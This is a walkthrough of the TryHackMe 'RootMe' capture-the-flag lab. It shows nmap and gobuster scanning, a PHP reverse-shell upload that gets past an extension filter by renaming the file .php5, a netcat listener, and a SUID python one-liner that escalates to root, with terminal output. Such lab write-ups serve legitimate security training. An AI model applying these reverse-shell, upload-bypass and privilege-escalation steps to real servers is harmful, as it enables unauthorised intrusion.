---
title: TryHackMe RootMe
date: 2021-07-06T13:36:08+05:30
lastmod: 2021-07-06T13:36:08+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://bit.ly/34sGFiK
featureimage: img/thm.png

categories:
  - TryHackMe
tags:
  - tryhackme
  - rooms
  - thm
  - RootMe

draft: false
description: "TryHackMe RootMe walkthrough with step-by-step solutions — enumeration, exploitation, and privilege escalation on the RootMe challenge room."
---
## RootMe

## Task 01: Deploy the Room

---

## Task 02:  Reconnaissance

### 2.1

**Scan the machine, how many ports are open?**

run the command: `nmap -sC -sV -oN nmap MACHINE_IP`

### 2.2

**What version of Apache is running?**

Ans is in [task 2.1](#21) output result. use `cat nmap` to see the output file.

### 2.3

**Find directories on the web server using the GoBuster tool.**

`gobuster dir -u 10.10.71.82 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

### 2.4

**What is the hidden directory?**

ans is in output of [task 2.3](#23)

---

## Task 03: Getting a shell

* find a php shell and copy to home dir.
  
     ```bash
     root@ip-10-10-167-77:~# locate php-reverse
     /usr/share/webshells/php/php-reverse-shell.php
     /usr/share/wordlists/SecLists/Web-Shells/laudanum-0.8/php/php-reverse-shell.php
     root@ip-10-10-167-77:~# cp /usr/share/webshells/php/php-reverse-shell.php .
     
     ```

* Modify the shell with our VPN IP & Port(you can select any port number)
  
     ```bash
     49 $ip = 'YOUR_VPN_IP';  // IP line 49
     50 $port = 9001;       // PORT line 50
     ```

* start a listener on our system  

     ```bash
     nc -lvnp 9001 #our port numebr
     ```

* Upload the php file to the website using the hidden directory we found in [task 2.3](#23)

     you'll receive this error msg:

     ![img](https://i.imgur.com/S7aP6XZ.png)

     seems like some short of php filering?? let's try with diffrent php extention like `php5` instead of `.php` our new shell file is now `rev.php5`
     
     ```bash
     root# mv rev.php rev.php5
     ```

     let's try again!

     **IT WORKEDDD!!!**

     ![img](https://i.imgur.com/MomaQ6I.png)

     now let's browse to `http://MACHINE_IP/uploads` and click on our file name `rev.php5`

     Check the terminal, we got a connection back!!

     ![rev](https://i.imgur.com/b5JhLhS.png)


### 3.1

**find the user flag**

* run this command
  
     ```bash
     root# find / -type f -name user.txt 2> /dev/null

     root# /var/www/user.txt #location. 

     root# cat /var/www/user.txt #read the flag

     ```

    * -type f – you are telling find to look exclusively for files
    * -name user.txt – instructing the find command to search for a file with the name “user.txt”
    * 2> /dev/null – so error messages do not show up as part of the search result---

## task 04: Privilege escalation

### 4.1

**Search for files with SUID permission, which file is weird?**

* running this command reveals the binary `find / type -f -user root -perm -u=s 2> /dev/null`

> HINT: A snake? or a program named after Snake?

### 4.2

* Check gtfobins on how to exploit the suid above. Access [gtfobins here](https://gtfobins.github.io/). Then search for the specific binary you found above and study how you can exploit through SUID.
  
     `python -c 'import os; os.execl("/bin/sh", "sh", "-p")`

```bash
root@ip-10-10-167-77:~$ nc -lvnp 9001
Listening on [0.0.0.0] (family 0, port 9001)
Connection from 10.10.71.82 39224 received!
Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 08:49:18 up 38 min,  0 users,  load average: 0.00, 0.02, 0.06
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: cant access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

     # you might see a blank line, just type `id` or `whoami` to verify root

id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
cat /root/root.txt
THM{blaah-blah}
```